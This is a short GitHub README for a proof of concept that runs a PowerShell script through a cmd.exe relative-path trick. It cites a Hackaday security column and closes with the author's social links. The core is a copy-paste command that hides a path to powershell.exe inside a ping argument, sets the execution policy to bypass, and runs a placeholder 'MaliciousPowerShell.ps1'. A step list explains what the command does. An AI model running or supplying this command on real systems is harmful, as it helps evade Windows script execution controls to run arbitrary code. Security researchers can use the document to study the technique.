# Cmdexerelativepathpoc
PowerShell script execution via cmd.exe relative path
This was in Hackaday article:
https://hackaday.com/2020/06/12/this-week-in-security-crosstalk-tls-resumption-and-brave-shenanigans/

This can be run from Windows 10 run copy and paste code
cmd.exe /c "ping 127.0.0.1/../../../../../../../Windows/system32/WindowsPowerShell/v1.0/powershell.exe" -ExecutionPolicy bypass -file c:\temp\MaliciousPowerShell.ps1

Path and file of PowerShell script are variables you can change
c:\temp\MaliciousPowerShell.ps1

cmd.exe will 
1. load a DOS prompt
2. cancel the ping command 
3. Run PowerShell with the Execution Policy in bypass mode
4. Load a PowerShell Script and execute

## Connect with me at

<a href="https://twitter.com/HMInfoSecViking?ref_src=twsrc%5Etfw"><IMG SRC="https://github.com/bvoris/bvoris/blob/master/twitter.jpg" WIDTH=10% HEIGHT=10% ALIGN=LEFT></a>

<a href="https://www.linkedin.com/in/brad-voris" target="_blank"><IMG SRC="https://github.com/bvoris/bvoris/blob/master/linkedin.png" WIDTH=10% HEIGHT=4% ALIGN=RIGHT></a>

<BR /><BR />
<BR /><BR />

<A HREF="https://www.victimoftechnology.com">Victim Of Technology<A />
<BR /><BR />
<A HREF="https://www.cyberforgesecurity.com">Cyber Forge Security, Inc.<A />
<BR /><BR />
